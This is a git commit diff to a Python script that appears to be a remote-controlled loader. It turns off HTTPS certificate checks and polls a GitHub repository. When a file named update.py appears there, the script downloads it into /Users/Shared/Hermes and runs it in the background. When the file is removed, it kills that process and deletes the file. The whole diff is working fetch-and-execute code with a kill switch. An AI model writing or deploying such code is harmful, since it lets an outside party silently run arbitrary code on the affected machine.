b1296cfda21e9d0a665733c2ae98dc6f83f82695
3-TA <77489816+3-TA@users.noreply.github.com>
2023-11-16 04:27:23 +0800

    Update changelisten2.py

--- changelisten2.py
+++ changelisten2.py
@@ -1,5 +1,4 @@
 import re
-import urllib2
 import urllib
 import os
 import ssl
@@ -9,28 +8,31 @@ import sys
 import signal
 
 ssl._create_default_https_context = ssl._create_unverified_context
+#urllib.urlretrieve("https://github.com/3-TA/Loki/raw/main/update.py", "/Users/Shared/Hermes/update.py")
 
 def check_script(git_repo_link, name):
     try:
-        r = urllib2.urlopen(git_repo_link)
+        r = urllib.urlopen(git_repo_link)
         html_doc = r.read()
         file = re.findall(name, html_doc)
+        #file = True
         if file:
             if os.path.exists("/Users/Shared/Hermes/update.py"):
                 pass
             else:
                 urllib.urlretrieve("https://github.com/3-TA/Loki/raw/main/update.py", "/Users/Shared/Hermes/update.py")
                 time.sleep(2)
+                #os.system ('python /Users/Shared/Hermes/update.py')
                 p = subprocess.Popen([sys.executable, '/Users/Shared/Hermes/update.py'],
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT)
-                with open("pid.txt", "w") as f:
+                with open("/Users/Shared/Hermes/pid.txt", "w") as f:
                     f.write(str(p.pid))
         else:
             try:
                 try:
                     PID = ""
-                    with open('pid.txt') as f:
+                    with open('/Users/Shared/Hermes/pid.txt') as f:
                         PID = f.readline()
                     os.kill(int(PID), signal.SIGKILL)
                 except:
@@ -38,7 +40,8 @@ def check_script(git_repo_link, name):
                 os.remove('/Users/Shared/Hermes/update.py')
             except:
                 pass
-    except:
+    except Exception as e:
+        print (e)
         pass
 
 check_script('https://github.com/3-TA/Loki/tree/main', 'update.py')
